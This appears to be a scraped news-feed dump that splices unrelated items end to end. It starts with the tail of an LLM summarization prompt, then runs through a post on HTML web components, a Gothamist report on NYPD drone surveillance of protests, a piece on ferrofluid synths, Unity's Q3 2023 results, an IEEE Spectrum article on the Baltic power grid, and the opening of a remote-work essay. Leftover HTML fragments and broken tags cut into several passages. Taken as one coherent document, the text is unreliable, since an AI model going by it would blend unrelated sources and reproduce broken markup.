</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>(e.g., "this article discusses") to reach -80 words.
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>- Make every word count: re-write the previous summary to improve
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>flow and make space for additional entities.
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>- Make space with fusion, compression, and removal of uninformative
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>phrases like "the article discusses"
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>- The summaries should become highly dense and concise yet
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>self-contained, e.g., easily understood without the Article.
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>- Missing entities can appear anywhere in the new summary.
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>- Never drop entities from the previous summary. If space cannot be
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>made, add fewer new entities.
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>Remember, use the exact same number of words for each summary.

          <p>I think the word “component” in “web components” confused a lot of people — at least it did me.</p>
<p>“Web components” sounded like the web platform’s equivalent to “React components”. JSX had <code>&lt;MyComponent&gt;</code> and now the web had <code>&lt;my-component&gt;</code>.</p>
<p>But when you try building web components the same way you build React components, it’s easy to get frustrated and give up because web components don’t work like React components — I know I gave up a few times.</p>
<p><a href="https://frankchimero.com/blog/2015/the-webs-grain/">The grain</a> of a React component is not the grain of a web component. Their design prioritize different functionality and forms of use. If you try to use one like the other, you’ll fight the direction of their natural grain.</p>
<p>Web components have their own grain and it favors enhancement over replacement. What do I mean by this?</p>
<p>A typical React component might look like this<sup id="fnref:1"><a href="#fn:1">[1]</a></sup>:</p>
<pre><code>&lt;<span>UserAvatar</span>
  src=<span>"https://example.com/path/to/img.jpg"</span>
  alt=<span>"..."</span>
/&gt;
</code></pre>
<p>You could write a web component this same way, e.g.</p>
<pre><code><span>&lt;<span>user-avatar</span>
  <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span>
  <span>alt</span>=<span>"..."</span>
&gt;</span><span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>But the unique power of web components (in the browser) is that they can render <em>before</em> JavaScript. React components cannot do this — full stop.</p>
<p>This feature of web components <a href="https://blog.jim-nielsen.com/2023/as-good-as-html/">encourages a design of composability</a>. Rather than an empty “shell component” that takes data and (using JavaScript exclusively) renders the entirety of its contents, web components encourage an approach of composing core content with HTML and then wrapping it in a custom element that enhances its contents with additional functionality.</p>
<pre><code><span>&lt;<span>user-avatar</span>&gt;</span>
  <span>&lt;<span>img</span> <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span> <span>alt</span>=<span>"..."</span> /&gt;</span>
<span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>This specific flavor of componentization is what Jeremy calls <a href="https://adactio.com/journal/20618">“HTML web components”</a>:</p>
<blockquote>
<p>If your custom element is empty, it’s not an HTML web component. But if you’re using a custom element to extend existing markup, that’s an HTML web component.</p>
<p>React encouraged a mindset of replacement: “forgot what browsers can do; do everything in a React component instead, even if you’re reinventing the wheel.”</p>
<p>HTML web components encourage a mindset of augmentation instead.</p>
</blockquote>
<p>I like that term “HTML web component”. It stands in contrast to a “JavaScript web components” which would be an empty element whose functionality and contents rely exclusively on JavaScript.</p>
<p>Per my earlier example, this would be a JavaScript web component:</p>
<pre><code><span>&lt;<span>user-avatar</span>
  <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span>
  <span>alt</span>=<span>"..."</span>
&gt;</span><span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>It relies exclusively on the presence of JavaScript and is meaningless to the end user without it.</p>
<p>Whereas this would be an HTML web component:</p>
<pre><code><span>&lt;<span>user-avatar</span>&gt;</span>
  <span>&lt;<span>img</span> <span>src</span>=<span>"https://example.com/path/to/img.jpg"</span> <span>alt</span>=<span>"..."</span> /&gt;</span>
<span>&lt;/<span>user-avatar</span>&gt;</span>
</code></pre>
<p>It has meaning and content without JavaScript — then is enhanced by its presence.</p>
<p>This idea of augmentation/enhancement over replacement is intriguing.</p>
<h2 id="on-the-web-augmentation-wins-in-the-long-run">On The Web, Augmentation Wins in the Long Run</h2>
<p>Augmentative approaches work best on the web because 1) the web’s grain encourages enhancement to improve resilience, and 2) that’s really the best way to iteratively change something as big as the web.</p>
<p>Eventually all the best ideas of web-adjacent frameworks are subsumed into the platform to work in ways that augment the existing technology rather than replace it wholesale.</p>
<p>XHTML wanted to replace HTML4, but HTML5 wanted to augment it. HTML5 won.</p>
<p>Networking libraries wanted to replace <code>XMLHttpRequest</code> and their best ideas were eventually ported into the <code>fetch</code>  standard — which exists in more places than just the browser these days!</p>
<p>The best ideas of Sass and jQuery were ported to the browser.</p>
<p><a href="https://blog.jim-nielsen.com/2023/the-flavors-of-typescript/">Typescript’s best ideas are going to the browser</a>, but in a way that works to enhance not replace what exists.</p>
<p>With web components, you might even say React’s component model is being ported to the browser. But it’s being done in a way that works to enhance how the web already works, not replace it.</p>
<p>My takeaway is: if you’re looking for longevity, opt for a technical approach of augmentation and enhancement over replacement. The web’s grain is arranged in that direction.</p>

<div id="readability-page-1" class="page"><div><!--[--><!--[--><div><p>The NYPD has more than tripled its use of drones in the last year, most recently deploying them 13 different times to monitor public protests last month, according to police data.</p><p>Between April and June of this year, the department deployed drones 143 times. Before that, it had never deployed drones more than 50 times in a three-month period, <a href="https://www.nyc.gov/site/nypd/stats/reports-analysis/uas-drones.page" rel="noopener" target="_blank">the data shows</a>.</p><p>Police handed over drone footage from protests in Times Square and in Bay Ridge last month to prosecutors to use as evidence in criminal charges against 158 people, officials said.</p><p>The NYPD’s drone fleet has doubled in size since the program was launched five years ago – from 13 drones then to 30 today, and will continue to expand in the coming years.</p><p>New Yorkers attending large-scale events and <a href="https://gothamist.com/news/nypd-using-drones-to-monitor-jouvert-west-indian-day-parade" rel="noopener" target="_blank">celebrations</a> are now likely to spot drones hovering overhead. They are being used to scan for sharks off summer beaches, make rescues during storms and capture the scenes of police shootings, police said.</p><p>Prosecutors have historically used NYPD drone footage during the 2020 Black Lives Matter movement and as evidence in other cases like robberies, according to Oren Yaniv, a spokesperson for the Brooklyn district attorney. NYPD Assistant Commissioner Kaz Daughtry, who oversees the department’s new technology, says he hopes one day they will be saving lives by dropping flotation devices to struggling swimmers, and delivering the overdose prevention drug Narcan to people in drug-induced medical distress. Daughtry even said he is researching having drones respond to some crime reports.</p><p>But as the NYPD looks to use drones in new ways, some civil liberties activists say they see it as an undemocratic violation of privacy. They, along with a tech policy expert interviewed by Gothamist, point out that no agency outside the NYPD oversees or regulates how the department uses information gathered by drones.</p></div><!--]--><!--[--><!--]--><!--[--><div><p>“This is a local police department that increasingly acts like a national intelligence agency,” said Albert Fox Cahn, founder and executive director of Surveillance Technology Oversight Project.</p><p>“The idea that you can have a drone hovering over a protest, collecting the identities of every person there, without any oversight, without any protections? That's unbelievably chilling.”</p><p>In an exclusive drone demonstration for Gothamist, NYPD Detective Matthew Andrews-Sales, the NYPD’s head drone pilot, explained that the NYPD’s drone cameras can zoom in on people and objects up to 200x from the air, showing people’s faces clearly. But Daughtry said that function is reserved for New Yorkers committing crimes or infractions.</p><p>The NYPD has long maintained that its drones aren’t equipped with facial recognition software – technology that has led people to be <a href="https://innocenceproject.org/when-artificial-intelligence-gets-it-wrong/#:~:text=The%20use%20of%20such%20biased,match%20%E2%80%94%20all%20six%20were%20Black." rel="noopener" target="_blank">falsely accused of crimes</a> elsewhere. But police can run drone footage through facial recognition software back at police headquarters. Department officials said that a police detective manually reviews every facial match before police move to make an arrest.</p><p>The NYPD deletes drone footage after 30 days unless it's being used to investigate an alleged crime like the Bay Ridge protest, and that the drones it currently uses cannot record audio, Daughtry said.</p></div><!--]--><!--[--><figure><figcaption><!----><p>Police headquarters in lower Manhattan</p><p>Bahar Ostadan / Gothamist</p></figcaption></figure><!--]--><!--[--><div><p>Some tech policy experts consider drones to be among the least invasive policing strategies — as long as police aren’t using them to mass identify every person at a protest.</p><p>“[Drones] don’t really give anything other than a different vantage point,” said Adam Scott Wandt, vice chair for technology of the Department of Public Management at John Jay College of Criminal Justice. “The police have cameras on poles and on top of cars everywhere anyway.”</p><p>“You should be expecting the government to be taking pictures of you from every angle.”</p><h4><b>How the program works</b></h4><p>The NYPD’s Technical Assistance Response Unit, which is headquartered at an old army base in Queens, already uses drones for a range of purposes. Officers used drones this summer to measure crowd size at <a href="https://gothamist.com/news/nypd-using-drones-to-monitor-jouvert-west-indian-day-parade" rel="noopener" target="_blank">J’Ouvert and the West Indian Day Parade</a> in Brooklyn and the <a href="https://gothamist.com/news/nypd-reports-one-of-the-safest-labor-day-weekends-on-record" rel="noopener" target="_blank">Electric Zoo festival</a> on Randall’s Island, Daughtry said. In September, police said they used a drone to help rescue someone trapped inside their car as <a href="https://gothamist.com/news/rain-soaks-nyc-region-with-more-than-three-inches-overnight" rel="noopener" target="_blank">heavy rains flooded the city’s roadways</a>. The drone footage was streamed to police headquarters, and officers deployed police and firefighters to help the driver exit safely.</p><p>The NYPD also uses drones to capture scenes of police shootings, Daughtry said. They capture 360-degree visuals of buildings and streets, and the department pairs it with officer body-worn camera footage and then shows it to the commissioner for review.</p><p>A live feed from the drones is screened at the police headquarters in Lower Manhattan, where dozens of officers monitor video from tens of thousands of police cameras across the five boroughs. Law enforcement officials in the field can also view the live drone feeds from their cellphones or iPads, Daughtry said.</p></div><!--]--><!--[--><figure><figcaption><!----><p>Police demonstrate a drone deployment at police headquarters.</p><p>Bahar Ostadan / Gothamist</p></figcaption></figure><!--]--><!--[--><div><p>Mayor Eric Adams has championed police drones in part because he says they save the city money. While flying an NYPD helicopter costs up to $2,200 per flight, he said launching a drone <a href="https://gothamist.com/news/nypd-reports-one-of-the-safest-labor-day-weekends-on-record" rel="noopener" target="_blank">costs just 17 cents</a>. Some drones tethered to police cars can run on vehicle gasoline, Daughtry said.</p><h4><b>Program has been veiled in secrecy</b></h4><p>The NYPD has been tight-lipped about its use of drones, saying that revealing too much about the technology and when it is deployed could compromise police investigations. Officials have refused to share information on surveillance and technology products it has purchased, keeping contracts “offline” and out of the public eye. A state Supreme Court justice last month <a href="https://legalaidnyc.org/wp-content/uploads/2023/10/156967_2021_The_Legal_Aid_Society_v_The_Legal_Aid_Society__DECISION___ORDER_ON_73.pdf" rel="noopener" target="_blank">granted a request</a> from the Legal Aid Society to access historically opaque NYPD “special expense” budget contracts for various electronic surveillance technologies — which could reveal more about policing technology and how it is used.</p><p>Federal <a href="https://www.ecfr.gov/current/title-14/chapter-I/subchapter-F/part-107/subpart-B/section-107.39" rel="noopener" target="_blank">drone law</a> says that “no person may operate a small unmanned aircraft over a human being.” But the NYPD has an <a href="https://www.faa.gov/uas/commercial_operators/part_107_waivers" rel="noopener" target="_blank">exemption waiver</a> from the Federal Aviation Administration through August 2025 that allows it to fly drones in populated areas, at night, over 400 feet in the air, among other things.</p><p>The NYPD is also required to get special FAA authorization to fly its drones in certain cases, according to FAA spokesperson Arlene Salac. When asked for specific information about how often the NYPD flies its drones and for what purpose, Salac declined to say and asked Gothamist to submit a Freedom of Information Act request.</p><h4><b>NYC drones fleet continues to expand</b></h4><p>The NYPD paid $87,750 in June for a <a href="https://brincdrones.com/lemur-2/?utm_source=googlesearchads&amp;utm_medium=cpc&amp;utm_campaign=brandedKW&amp;campaignid=20477355960&amp;adgroupid=156565704870&amp;creative=670810272934&amp;matchtype=b&amp;network=g&amp;device=c&amp;keyword=brinc%20lemur%20s" rel="noopener" target="_blank">Lemur 2 drone</a> manufactured by Seattle-based drone company BRINC, according to city records. Lemur 2 drones have night vision and thermal sensors. They can break glass to enter buildings and recreate floor plans with 360-degree views, which police say can be used for situations like the April <a href="https://gothamist.com/news/what-we-know-about-the-deadly-parking-garage-collapse-in-lower-manhattan" rel="noopener" target="_blank">parking garage collapse</a>. The drones can even facilitate two-way audio conversations between officers and anyone inside a building.</p><p>BRINC Founder and CEO Blake Resnick said the NYPD has not yet received its Lemur 2 drone.</p></div><!--]--><!--[--><figure><figcaption><!----><p>Detective Matthew Andrews-Sales, the NYPD’s head drone pilot and Detective Robert Bailey. Both in the NYPD Technical Assistance and Response Unit.</p><p>Bahar Ostadan / Gothamist</p></figcaption></figure><!--]--><!--[--><div><p>Adams has been a loud proponent of drones since his days as Brooklyn Borough President when he <a href="https://x.com/BKBoroHall/status/1208844668169003014?s=20" rel="noopener" target="_blank">pushed for a bill</a> in 2019 that would allow drones to conduct building inspections. As mayor last fall, he <a href="https://nypost.com/2022/03/26/eric-adams-mulls-using-drone-army-to-fight-nyc-crime-sources/" rel="noopener" target="_blank">met with the founders</a> of two Israeli drone companies who said their autonomous drones are used by the U.S. Customs and Border Protection to patrol the Mexican border, as well as by the Israel Defense Forces at the border of Gaza, <a href="https://www.jta.org/2022/03/18/ny/can-drones-make-nyc-safer-an-israeli-company-and-its-brooklyn-partner-pitch-the-idea-to-mayor-adams" rel="noopener" target="_blank">the Jewish Telegraphic Agency reported</a>. The city has not yet entered into a deal with either of these companies, according to the mayor’s spokesperson Charles Lutvak.</p><p>Adams and Daughtry also <a href="https://gothamist.com/news/mayor-adams-nypd-officials-tour-israels-national-police-academy-to-review-drone-technology" rel="noopener" target="_blank">reviewed new drone technology</a> in Israel while visiting the country’s National Police Academy in August. The NYPD has a long history of training with Israeli law enforcement, according to Detective Charlie Ben-Naim, a department liaison stationed in Tel Aviv. Israel is at the forefront of using drones as <a href="https://dronedj.com/2023/02/02/israel-police-drone-first-responders/" rel="noopener" target="_blank">first responders</a>, Daughtry said, and serves as inspiration for his plans to increase the NYPD’s drone fleet.</p><p>“We're not looking for grandma's secret recipe sauce that she's putting on a grill. We're not looking to see if you're making hamburgers or hot dogs. We're out there using drones to fight crime,” Daughtry said.</p></div><!--]--><!--]--></div></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://cdm.link/2023/11/black-goo-ferrofluid-synths/">https://cdm.link/2023/11/black-goo-ferrofluid-synths/</a>, See on <a href="https://news.ycombinator.com/item?id=38250913">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    	  
<p>LEDs, cathode ray tubes, blinky lights – move over. Once you’ve seen dancing animated black goo frolicking in space to sound, you never go back. Love Hultén has been plus-ing their custom instruments with ferrofluids, and the results are simply magical.</p>



<p>From yesterday, there’s this beautiful creation with a KORG minilogue xd inside. (There’s also a Collider according to the notes, which I think is the <a href="https://www.sourceaudio.net/collider_delay_reverb.html">Source Audio delay/reverb</a>.)</p>



<figure><p>
<iframe title="Ferrofluid synth" width="500" height="281" src="https://www.youtube.com/embed/VyQGLJe2sek?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>This isn’t the first time Love has added ferrofluids to a custom build. Over the summer, Love transformed a <a href="https://www.twistedelectrons.com/deton8">Twisted Electronics Deton8</a> into a ferrofluid-animated drum synth, with these delicious results:</p>



<figure><p>

</p></figure>



<p>The inspiration for all of this, says Love, is DAKD Jung’s wondrous ferrofluid-display Bluetooth speaker project:</p>



<figure><p>
<iframe loading="lazy" title="Ferrofluid display cell bluetooth speaker" width="500" height="281" src="https://www.youtube.com/embed/pgp2sp0EB7w?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>Now, to be honest, I haven’t been keeping up with DIY ferrofluid sonic animations – though seeing this, I wonder what I’ve been doing with my life instead. Fortunately, Hackaday were keeping abreast of all things ferrofluids and naturally, you have to do some <em>work</em> to get results this good, as Donald Papp explained in June:</p>



<p><a href="https://hackaday.com/2023/06/15/ferrofluid-drum-synth-dances-to-the-beat/">Ferrofluid drum synth dances to the beat</a> [Hackaday]</p>



<p><em>(Hey, did they get rid of the hyphens in their site title? Seems like a failure of brand recognition, like someone turning a <a href="https://createdigitalmusic.com/">known name</a> into an <a href="https://cdm.link/">acronym</a>, but <a href="https://duckduckgo.com/?q=kfc&amp;ia=web">what do I know</a>?)</em></p>



<p>Anyway, if all this ferrofluid business is freaking you out, Love also has an absolutely gorgeous “Chunky Mother-32.” That commission combines a Moog Mother 32, a Roland TR-08, and a <a href="https://www.soundonsound.com/reviews/hologram-electronics-microcosm">Hologram Electronics Microcosm</a>, plus a pull-out keybed. I mean, sure, <a href="https://cdm.link/2023/06/moog-music-has-been-bought-by-inmusic/">inMusic could make Moog stuff cheaper</a> theoretically, but what about making it <em>an order of magnitude more expensive</em>? </p>



<figure><p>

</p></figure>



<p>And… two words. MIDI. Crab.</p>



<figure><p>
<iframe loading="lazy" title="Sebastian - The MIDI crab" width="500" height="281" src="https://www.youtube.com/embed/ismKwb2zHBs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<figure><p>
<iframe loading="lazy" title="Cousteau synth" width="500" height="281" src="https://www.youtube.com/embed/-lsPRnRF7zo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
</p></figure>



<p>Honestly, the ultimate evolution of displays is certainly for everything to turn into crabs. Don’t ask me, ask an evolutionary biologist; <a href="https://en.wikipedia.org/wiki/Carcinisation">carcinisation</a> is <em>science</em>, y’all.</p>



<p>And, actually, having turned this site into an acronym and had it survive for nearly 20 years, I expect next it should turn into a crab. (Crab Digital Music? Dunno.)</p>



<p>It’s the future of music.</p>

Unity has released its financial results for the three months ended September 30, 2023, announcing layoffs despite a significant growth in revenue and a drop in overall net loss.</p>
<h2>The numbers</h2>
<ul>
<li><strong>Revenue:</strong> $544 million (up 69% year-on-year)</li>
<li><strong>Net loss:</strong> $125 million (compared to $250 million last year)</li>
<li><strong>Create Solutions revenue:</strong> $189 million (flat year-on-year)</li>
<li><strong>Grow Solutions revenue:</strong> $355 million (up 166% year-on-year)</li>
</ul>
<h2>The highlights</h2>
<p>Unity's revenue increased 69% year-over-year to $544 million, while it reported a net loss reduced by half to $125 million, compared to $250 million during the same period last year.
</p>
<p>
Despite this, Unity has announced more layoffs as a result of a "comprehensive assessment of its product portfolio" at the beginning of its fourth quarter, as detailed in <a href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001810806/19c99810-0173-4d43-888c-b5feba311d3f.pdf">its Q3 2023 report.</a>
</p>
<p>
"The assessment will likely lead us to decide to discontinue certain offerings, reduce our workforce and reduce our office footprint," the company said.
</p>
<p>
It added: "The timing and full impact of these types of changes on our future results of operations, cash flows, or financial condition are uncertain, and for those reasons we are currently unable to reasonably quantify the potential impacts through the fourth quarter of 2023."
</p>
<p>
As a result, the company did not provide any guidance for Q4 or the full year 2023.
</p>
<p>
During Unity's earnings call (transcribed by <a href="https://seekingalpha.com/article/4650087-unity-software-inc-u-q3-2023-earnings-call-transcript">Seeking Alpha</a>) following the release of its Q3 results , Unity's CFO Luis Visoso said decisions would be made and implemented during this quarter, with a target of being finalised by Q4 2023. 
</p>
<p>
"It's not like a business model transition that takes a year or two years to complete," said Visoso. "These are things we were planning to do and executing now."
</p>
<p>
This was referred to as a "rip off the band-aid reset" by interim CEO James Whithurst.
</p>
<p>
Looking at Create Solutions revenue (the division in charge of Unity's engine), core subscriptions were up 19% during Q3 but revenue was flat year-on-year.
</p>
<p>
"Three sectors negatively impacted growth this quarter: Unity Game Services (UGS), China, and professional services," the report read. "UGS had a record third quarter last year from new game launches, China revenue declined from continued government restrictions on gaming, and we continue to reduce our reliance on professional services."
</p>
<p>
As for its Grow Solutions vertical (Unity's ads products and services), revenue increased by 166% year-on-year to $355 million despite the <a href="https://www.gamesindustry.biz/unity-apologises-for-controversial-runtime-fee-promises-changes-to-the-policy">backlash in response to its proposed runtime fee</a> announced in September.
</p>
<p>
"We continue to believe that we are gaining share in a relatively flat market," the company said. "We experienced some revenue softness at the end of the quarter and in October from the runtime fee introduction, which is now mostly behind us."
</p>
<p>
In the letter to shareholders, Whitehurst said Unity was "doing too much" and aimed to "emerge as a leaner, more agile, and faster growing company" for the next quarter.
</p>
<p>
He added: "Going forward, we plan to increase our focus on our core; the Unity Editor and Runtime, and Monetisation Solutions as we continue to see significant opportunities for growth in these businesses, including AI. 
</p>
<p>
"In addition, we aim to sharpen our focus on fewer large and more attractive businesses where our capabilities offer a clear competitive advantage like Digital Twins."

            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/baltic-power-grid">https://spectrum.ieee.org/baltic-power-grid</a>, See on <a href="https://news.ycombinator.com/item?id=38250001">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-elid="2666201539" data-post-url="https://spectrum.ieee.org/baltic-power-grid" data-authors="Peter Fairley" data-headline="To Free The Baltic Grid, Old Technology Is New Again" data-page-title="To Free The Baltic Grid, Old Technology Is New Again - IEEE Spectrum"><p>The Baltic countries—Lithuania, Latvia and Estonia—recently accelerated a plan to cut the electrical chains that keep them tied to Russia. A technical lynchpin to their planned escape from <a href="https://en.wikipedia.org/wiki/IPS/UPS" rel="noopener noreferrer" target="_blank">the Moscow-controlled synchronous AC power zone</a> is a constellation of synchronous condensers: free-­spinning and fuel-free electrical generators whose sole purpose is to stabilize and protect power grids. </p><p>The Baltic states, all of which are members of the European Union and NATO, started freeing themselves from Russia’s electrical embrace almost a decade ago with the construction of <a href="https://spectrum.ieee.org/fear-of-russia-drives-highvoltage-power-projects-in-the-baltics" target="_self">high-voltage direct current (HVDC) connections to Finland, Sweden and Poland</a>. Those alternative sources of electrical support ended the Baltics’ dependance on imported power from Russia and Belarus. </p><p>Now stabilizing equipment is preparing the grid to be able to physically separate from the giant grid to the East, and to synchronize instead with the continental European grid to the South. In 2019, funding from the European Union jumpstarted the required grid-strengthening upgrades required, and synchronization with Europe was scheduled for the end of 2025. </p><p>“Being on the Russian electricity grid is a risk for Estonian consumers.”</p><p>Cost increases have delayed a crucial second link with Poland and thus Europe to 2028, but the full-scale invasion of Ukraine and <a href="https://spectrum.ieee.org/russia-targets-ukraine-grid" target="_self">Russia’s ariael assaults on the Ukrainian grid</a> boosted pressure on the Baltics to break away faster. In August the Baltic states reached consensus on a plan to switch grids no later than February of 2025. </p><p>As Estonian Prime Minister Kaja Kallas <a href="https://elering.ee/en/baltic-prime-ministers-we-will-leave-russian-electricity-grid-early-2025-latest" target="_blank">explained</a>: “Russia’s aggression in Ukraine and its use of energy as a weapon proves that it’s a dangerous and unpredictable country, and therefore being on the Russian electricity grid is a risk for Estonian consumers.” The prime ministers, she said, agreed to, “leave the Russian network as soon as the technical capacity is in place.”</p><p>This is where synchronous condensers step in. Synchronous condensers (also called synchronous compensators) are essentially generators that, in normal operation, are spun by an AC grid’s power and synced to its frequency (rather than driven by their own fuel). When power plants and/or transmission lines shut down unexpectedly, the momentum in their spinning mass offers an instantaneous supply of energy that cushions the blow, thus protecting equipment and preventing outages. </p><p><img alt="A large room houses boxy machinery, as well as many pipes and nozzles.

But plants with steam and turbine-driven generators are increasingly being replaced by solar panels, wind turbines and batteries that deliver their energy via electronic converters. Hence a worldwide comeback for a <a href="https://www.modernpowersystems.com/features/featurege-synchronous-condensers-100-years-on-7769875/" rel="noopener noreferrer" target="_blank">technology that was invented over a century ago</a>. </p><p>In recent decades AC grids are experiencing more events where synchronization breaks down.</p><p>Joswig says there’s been an extra growth spurt as the energy transition accelerated over the last several years: “Before, some grid operators told me there is no market for the synchronous condenser. Now they can not get enough.” </p><p>Synchronizing with Europe drives added need for grid services in the Baltics. Europe has very large power plants whose failure can cause larger disruptions than the Baltics have traditionally faced. And, notes Joswig, in recent decades AC grids are experiencing more events where synchronization breaks down, leaving some regions electrically isolated—a scenario that will be extra-relevant for the Baltics while it is operating with just one AC link to continental Europe. </p><p>When Spectrum profiled the re-emergence of synchronous condensers in 2015, there was a notable trend toward the <a href="https://spectrum.ieee.org/zombie-coal-plants-reanimated-to-stabilize-the-grid" target="_self">conversion of steam generators</a> as coal-fired and <a href="https://spectrum.ieee.org/tag/nuclear-power">nuclear power</a> plants shut down. Today’s notable tech trend, says Joswig, is the addition of flywheels weighing hundreds of tonnes to boost momentum. All nine of the Baltics’ synchronous condensers will have power-boosting flywheels, as she explains, equipping each installation with up to 2,200 megajoules of energy. That’s roughly equivalent to the kinetic energy of a 3,000 tonne train cruising at 100 kilometers per hour.</p><p><img alt="A map of the Baltic states showing work being done to disconnect from the Russian power system." data-rm-shortcode-id="7ce2f0d6525ba5ba259d6f9346ce8013" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-map-of-the-baltic-states-showing-work-being-done-to-disconnect-from-the-russian-power-system.jpg?id=50447193&amp;width=980" height="2010" id="f9707" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-map-of-the-baltic-states-showing-work-being-done-to-disconnect-from-the-russian-power-system.jpg?id=50447193&amp;width=980" width="2546"><small placeholder="Add Photo Caption...">The Harmony Link HVDC cable as shown will give the Baltics a second transmission link to Europe.

Moving up the final line renovation, a circuit between Estonia and Latvia to be ready at the end of 2024, clinched the deal to accelerate synchronization with Europe. </p><p>Justinas Juozaitis, who heads the World Politics Research Group at Lithuania’s military academy, says Russian action forced the speed-up. For one thing, he says, Russia prepared faster for Baltic separation. </p><p>Russia and Belarus built new lines to strengthen their own grids. And Russia built four gas-fired power plants and an LNG import terminal in Kaliningrad, a Russian exclave on the Baltic Sea sandwiched between Poland and Lithuania. “By 2021 they had built the infrastructure and proved that Kaliningrad can operate independently,” says Juozaitis. That, he says, put Russia in a position to disrupt Baltic power without risk of blacking-out its own territory.</p><p>By the middle of 2022, the Baltics forged a protocol for “emergency synchronization,” by which it can switch to Europe’s grid in a matter of hours if necessary. The emergency plan calls for activation of transformers at the Polish-Lithuanian border, converting the country’s HVDC link to an AC interconnection, and provision of extra frequency regulation via plants in Sweden and Finland. </p><p>Juozaitis says the fact that <a href="https://spectrum.ieee.org/ukraine-europe-electricity-grid" target="_self">European grid operators fast-tracked and completed Ukraine’s synchronization</a> within one month of Russia’s invasion provides confidence that the Baltics can pull off an emergency switch. And he says recent events highlight the importance of being ready: mechanical damage sustained by a natural gas pipeline from Finland to Estonia and by <a href="https://spectrum.ieee.org/topic/telecommunications/">telecommunications</a> cables linking Estonia to Sweden. They appear to have been struck around the same time in early October. </p><p>Finnish authorities investigating the pipeline damage say their prime suspect is <a href="https://en.wikipedia.org/wiki/Newnew_Polar_Bear" target="_blank">a Chinese-flagged container ship, the Newnew Polar Bear</a>; Estonian authorities have said they are tracking <a href="https://en.wikipedia.org/wiki/Sevmorput" target="_blank">the Sevmorput, a nuclear-powered Russian cargo ship</a>, that was also in the vicinity of the pipeline and cables when they sustained damage. </p><p>“The Russian federation has the motive, and the chronology is very very strange,” notes Juozaitis. Russia and China have denied sabotaging the equipment. </p><p>Juozaitis says NATO has already stepped up naval patrols and other surveillance in the Baltic to protect infrastructure. But he says the Baltics also need to practice deterrence. As he puts it: “They must be signalling that if the Russians continue tampering with submerged infrastructure there are going to be consequences.” </p></div></div>]]></description>

<div id="readability-page-1" class="page"><section itemprop="articleBody">
							
<p><em>Spoilers: it’s not about whether remote or office work is better.</em></p>



<p>The prevalence of return to office mandates has provoked much discourse and strong opinions. For good reasons. Return to office mandates can tear teams apart by pushing out people who cannot relocate, at huge cost.&nbsp;&nbsp;&nbsp;</p>



<figure></figure>



<p>Working physically together, in the same space, as a whole team, can be extremely enabling. Supporting a joyful environment. Sadly, too many offices were (and remain) environments hostile to collaboration. Return to those hostile environments has been imposed on many. </p>







<p>It makes me sad to see people…</p>



<p>…forced to return to offices that are noisy, cramped, illness-spreading, collaboration-killing environments.&nbsp;</p>



<p>…conversing over video chat from across the same open-plan office, because while they’re in the same space it’s not set up to help them collaborate.</p>



<p>…excluded from teamwork because the rest of the team is in another location.</p>



<p>…stuck waiting on pull request reviews from people they are sat right next to.</p>



<p>Most of all I get sad when I see ineffective teams with no ability or motivation to improve—whether remote or co-located.</p>



<p>For many teams there can be huge advantages to co-located working, but these aren’t it. Different approaches better support different people, different teams, different contexts.&nbsp;</p>



<p>Return to office mandates can destroy the effectiveness of teams who have <a href="https://benjiweber.co.uk/blog/2021/07/03/uncovering-better-ways/">uncovered better ways</a> of working by going remote.</p>



<p>Tearing your teams apart and undermining their ways of working are tremendously damaging. Fabled watercooler serendipity will not make up for this.</p>



<p>You’ll cause harm by forcing RTO on teams with cultures that benefit from remote. Please, instead, help your teams craft their best environment.&nbsp;</p>



<h2 id="notalwaysbest">Remote isn’t always Best</h2>



<p>Many people are very passionate about remote work. Remote can bring inclusion benefits. Offices can bring communication bandwidth benefits.&nbsp;</p>



<p>This claim crossed my feed this week:</p>



<p>“<em>Every successful company needs to have the most talented people. The most talented people no longer live in, or want to live in the same place.”&nbsp;</em></p>



<p>This suggests that “acquiring” talented people is a zero-sum game. It’s not.</p>



